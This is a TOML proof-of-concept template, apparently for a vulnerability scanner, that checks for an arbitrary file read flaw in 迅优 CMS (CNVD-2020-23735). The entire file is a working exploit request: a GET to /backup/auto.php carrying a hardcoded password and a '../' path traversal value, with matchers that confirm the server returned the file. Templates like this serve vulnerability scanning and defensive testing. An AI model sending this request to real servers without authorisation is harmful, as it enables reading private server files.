[info]
id = "POC-AVE-2026-0036"
name = "迅优cms任意文件读取漏洞 PoC"
author = "AVE"
severity = "high"
tags = ["lfi", "path-traversal", "file-read", "cnvd"]
description = "迅优cms /backup/auto.php 存在任意文件读取漏洞，通过password参数认证后利用path参数进行目录遍历读取任意文件"
vuln_id = ["CNVD-2020-23735", "AVE-2026-0036"]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/backup/auto.php"

[poc.requests.query]
password = "NzbwpQSdbY06Dngnoteo2wdgiekm7j4N"
path = "../backup/auto.php"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["NzbwpQSdbY06Dngnoteo2wdgiekm7j4N", "display_errors"]
expect = true
